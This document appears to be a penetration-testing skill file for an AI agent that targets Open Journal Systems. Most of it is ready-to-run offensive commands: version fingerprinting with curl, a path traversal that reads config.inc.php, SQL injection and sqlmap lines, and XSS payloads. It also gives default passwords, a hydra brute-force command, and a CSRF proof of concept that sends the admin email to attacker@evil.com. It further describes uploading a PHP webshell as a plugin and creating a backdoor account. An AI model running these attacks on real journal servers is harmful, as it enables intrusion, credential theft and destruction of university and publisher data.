---
name: ojs
description: Open Journal Systems (OJS) penetration testing — version fingerprinting, plugin vulnerabilities, authentication bypass, file upload, SQLi, and known CVEs
---

# Open Journal Systems (OJS) Penetration Testing

OJS (Open Journal Systems) by PKP (Public Knowledge Project) is widely deployed in universities, research institutions, and publishers. Its plugin architecture, PHP codebase, and often-outdated installations make it a high-value target. Many deployments run years-old versions due to manual upgrade friction.

## Attack Surface

**Version & Technology**
- PHP application (Laravel-like but custom MVC)
- PostgreSQL or MySQL backend
- Plugin system with 3rd-party plugins (often unmaintained)
- Default admin path: `/index.php/index/login` or `/login`
- REST API: `/api/v1/` (OJS 3.1+)

**Common Deployment Issues**
- Outdated OJS version (3.x < 3.3.0 or 2.x still in production)
- Default admin credentials (`admin:admin`)
- Publicly accessible `config.inc.php` or backup files
- Debug mode left enabled in production
- Writable `public/` and `cache/` directories executable by webserver
- PHPMailer, Smarty, and other bundled vulnerable libraries

**Entry Points**
- `/index.php/index/login` — admin/author/reviewer login
- `/index.php/{journal}/login` — per-journal login
- `/api/v1/` — REST API (token-based)
- `/index.php/index/install` — installer (if not removed)
- `/index.php/{journal}/submission` — file upload surface
- `/lib/pkp/` — core library paths
- Plugin admin panel: `/index.php/index/admin/plugins`

## Fingerprinting & Version Detection

```bash
# Version disclosure via meta tag
curl -s https://target.com/ | grep -i "pkp\|ojs\|generator"
# → <meta name="generator" content="Open Journal Systems 3.3.0.10">

# Version in page footer
curl -s https://target.com/ | grep -i "open journal\|pkp.org"

# Version file (older installations)
curl -s https://target.com/dbscripts/xml/version.xml
curl -s https://target.com/lib/pkp/version.xml

# Changelog
curl -s https://target.com/docs/CHANGELOG

# REST API version
curl -s https://target.com/api/v1/ | jq '.application,.version'

# Installed plugins (if admin or public listing enabled)
curl -s "https://target.com/index.php/index/admin/plugins"

# Check for installer
curl -sI "https://target.com/index.php/index/install"
```

## Key Vulnerabilities

### CVE-2023-5897 / CVE-2024-xxxx — Remote Code Execution (OJS 3.x)

OJS has had multiple RCE vulnerabilities via:
- Malicious plugin upload (`.tar.gz` with PHP webshell)
- Unsafe deserialization in older versions
- SSTI (Server-Side Template Injection) in custom templates

```bash
# Check OJS version against known CVEs
# OJS < 3.3.0.13 → multiple XSS, CSRF, SQLi vulnerabilities
# OJS 3.x < 3.4.0 → check PKP security advisories
curl -s https://pkp.sfu.ca/category/news/security-updates/
```

### Malicious Plugin Upload (Admin RCE)

If admin access is obtained, plugins can be uploaded as `.tar.gz`:

```
1. Create malicious plugin structure:
   evil-plugin/
     version.xml        ← required metadata
     index.php          ← PHP webshell

2. Compress: tar -czf evil-plugin.tar.gz evil-plugin/

3. Upload via Admin → Settings → Website → Plugins → Upload plugin

4. Trigger: https://target.com/plugins/generic/evil-plugin/index.php
```

### Unauthenticated File Read / Path Traversal

Older OJS versions exposed download endpoints without auth:

```bash
# OJS 2.x — arbitrary file download
curl "https://target.com/index.php/{journal}/article/downloadSuppFile/1/../../config.inc.php"

# OJS 3.x — check if submission files are accessible without auth
curl "https://target.com/public/journals/1/" | grep -i "index of"
```

### SQL Injection

OJS has had SQLi in search, submission filtering, and reviewer assignment:

```bash
# Search endpoint (older OJS 2.x/3.x)
curl "https://target.com/index.php/{journal}/search/search?query=test'--"

# API endpoint
curl "https://target.com/api/v1/submissions?searchPhrase=test'--" \
  -H "Authorization: Bearer <token>"

# Use sqlmap with cookie auth
sqlmap -u "https://target.com/index.php/{journal}/search/search?query=test" \
  --cookie="OJSSID=..." --level=3 --risk=2 --dbms=mysql
```

### Cross-Site Scripting (XSS)

Multiple reflected and stored XSS vectors:

```
Reflected:
  /index.php/{journal}/search/search?query=<script>alert(1)</script>
  /index.php/index/user/profile?source=<img src=x onerror=alert(1)>

Stored (if reviewer/author):
  - Article title, abstract, metadata fields
  - Submission comments (reviewer → editor)
  - Announcement content (if admin)
```

### Authentication Bypass / Weak Credentials

```bash
# Default credentials
admin:admin
admin:password
admin:ojs

# Username enumeration via login error
# "Invalid username or password" → no enumeration
# "No account found with that email" → enumeration possible

# Brute force login
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/index.php/index/login/signIn:username=^USER^&password=^PASS^:Invalid"

# OJS API token enumeration — if API keys are sequential or predictable
curl "https://target.com/api/v1/users" \
  -H "Authorization: Bearer <token>"
```

### REST API Abuse (OJS 3.1+)

```bash
# List all API endpoints
curl -s "https://target.com/api/v1/" | python3 -m json.tool

# Unauthenticated endpoints to test
GET /api/v1/submissions          → may expose submission metadata
GET /api/v1/issues               → journal issues
GET /api/v1/announcements        → announcements
GET /api/v1/contexts             → journal config (may expose admin email)

# With token — escalate privileges
POST /api/v1/users               → create user (admin only)
PUT  /api/v1/submissions/{id}    → modify submission
POST /api/v1/submissions/{id}/files → file upload
```

### CSRF

OJS < 3.3 had weak CSRF protection on many state-changing actions:

```html
<!-- CSRF PoC — change admin email -->
<form action="https://target.com/index.php/index/admin/settings" method="POST">
  <input name="email" value="attacker@evil.com">
  <input name="csrfToken" value="">
</form>
<script>document.forms[0].submit()</script>
```

### config.inc.php Exposure

The main config file contains DB credentials, secret salts, SMTP passwords:

```bash
# Direct access (should be blocked by webserver)
curl "https://target.com/config.inc.php"

# Backup files
for f in config.inc.php.bak config.inc.php~ config.inc.php.old config.php; do
  echo -n "$f: "; curl -so /dev/null -w '%{http_code}' "https://target.com/$f"; echo
done

# Cache directory traversal
curl "https://target.com/cache/"
```

### Installer Accessible

```bash
# If /install is accessible → full reinstall possible
curl -sI "https://target.com/index.php/index/install"
# 200 → critical finding — can wipe and reinstall DB
```

### File Upload in Submission Workflow

Authors can upload article files. Test for unrestricted upload:

```bash
# Upload PHP file as "article" or "supplementary file"
# Rename: shell.php → shell.php.pdf (then fuzz extension)
# Check if uploaded files are accessible via public URL
# Location: /public/journals/{id}/ or configured upload_dir
```

## Testing Methodology

1. **Version fingerprint** — meta tag, REST API, version.xml, CHANGELOG
2. **Default creds** — try `admin:admin`, `admin:password` on login page
3. **Installer** — check `/index.php/index/install` accessibility
4. **Config/backup files** — `config.inc.php.*`, `config.php`, backup dirs
5. **REST API audit** — enumerate `/api/v1/` endpoints, test unauth access
6. **XSS vectors** — search, profile, metadata fields
7. **SQLi** — search and API filter parameters with sqlmap
8. **File upload** — submission workflow, test extension bypass
9. **Plugin list** — enumerate installed plugins, match versions to CVEs
10. **Directory listing** — `/cache/`, `/public/`, `/files/`

## Post-Authentication (Admin)

```
Admin → Settings → Website → Plugins → Upload Plugin
  → Upload malicious .tar.gz with PHP webshell

Admin → Settings → Website → Appearance → Advanced
  → Custom CSS / Header injection → XSS escalation

Admin → Tools → Import/Export → Native XML Import
  → Test for XXE in XML import functionality

Site Admin → Users → Create User → assign Journal Manager
  → use as persistent backdoor account
```

## High-Value Findings

| Vulnerability | Condition | Impact |
|---|---|---|
| Installer accessible | No auth | Full DB wipe/reinstall |
| config.inc.php exposed | No auth | DB creds, SMTP, secret key |
| Plugin upload RCE | Admin access | Full server compromise |
| SQLi in search | No auth | DB dump, user hashes |
| Stored XSS in abstract | Author account | Admin session hijack |
| API unauthenticated submission list | No auth | PII disclosure |

## Pro Tips

1. Check `https://pkp.sfu.ca/category/news/security-updates/` — PKP publishes all CVEs with affected version ranges
2. OJS uses PHP sessions — `OJSSID` cookie; check for `HttpOnly`/`Secure` flags
3. Many OJS deployments use `files/` outside webroot but misconfigure webserver to serve it directly
4. The `cache/` directory often contains serialized PHP objects — test for deserialization if writable
5. OJS imports BibTeX, RIS, and XML — each is a potential injection vector (XXE, SSTI)
6. Reviewer accounts require only an email to register — low-privilege entry point for stored XSS
7. `nuclei -t cves/ -t exposures/` covers known OJS CVEs with automatic detection
8. Check bundled libraries: PHPMailer, Smarty, jQuery versions — often outdated
